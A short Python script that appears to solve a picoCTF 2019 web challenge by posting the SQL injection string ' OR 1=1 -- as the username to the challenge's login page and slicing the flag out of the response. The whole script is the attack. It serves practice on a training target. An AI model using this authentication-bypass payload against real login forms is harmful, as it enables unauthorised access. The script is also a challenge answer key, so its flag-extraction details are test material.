import requests

URL = "https://2019shell1.picoctf.com/problem/47253/login.php"

PAYLOAD = {
    'username': "' OR 1=1 --",
    'password': '',
    'debug': '0'
}

response = requests.post(url=URL, data=PAYLOAD)

data = response.text

flagIndex = data.index('picoCTF{')+8

flag = data[flagIndex:flagIndex+17]

print(flag)
